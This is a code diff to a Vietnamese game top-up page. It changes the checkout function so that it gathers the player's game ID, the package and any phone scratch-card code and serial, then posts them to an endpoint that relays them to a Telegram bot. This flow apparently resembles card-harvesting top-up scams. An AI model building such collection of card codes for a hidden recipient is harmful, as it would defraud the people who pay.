@@ -356,14 +356,56 @@
         if (method === "card") document.getElementById("section-card").classList.remove("hidden");
     }
 
-    function finishOrder() {
+        function finishOrder() {
         if (!currentPackage) {
             alert("Vui lòng chọn mốc nạp trước!");
             return;
         }
-        alert("Giao dịch thành công! Hệ thống đang xử lý đơn của bạn.");
-        location.reload();
-    }
+
+        let paymentType = document.getElementById("paymentMethod").value;
+        if (!paymentType) {
+            alert("Vui lòng chọn phương thức thanh toán!");
+            return;
+        }
+
+        let cardDetails = null;
+        if (paymentType === "card") {
+            let cardType = document.getElementById("cardType").value;
+            let cardPrice = document.getElementById("cardPrice").value;
+            let cardCode = document.getElementById("cardCode").value.trim();
+            let cardSerial = document.getElementById("cardSerial").value.trim();
+
+            if (!cardCode || !cardSerial) {
+                alert("Vui lòng nhập đầy đủ mã thẻ và số seri!");
+                return;
+            }
+            cardDetails = { cardType, cardPrice, cardCode, cardSerial };
+        }
+
+        let payload = {
+            gameId: `[${selectedGame}] ${currentGameId}`,
+            packageInfo: currentPackage,
+            paymentType: paymentType === "card" ? "Thẻ cào điện thoại" : "Chuyển khoản ngân hàng",
+            cardDetails: cardDetails
+        };
+
+        // Gửi dữ liệu về file api/send.js để đẩy tin nhắn về Telegram
+        fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .then(data => {
+            alert("Giao dịch thành công! Hệ thống đã gửi thông tin về bot.");
+            location.reload();
+        })
+        .catch(err => {
+            console.log(err);
+            alert("Có lỗi xảy ra khi kết nối hệ thống!");
+        });
+        }
+    
 </script>
 
 </body>
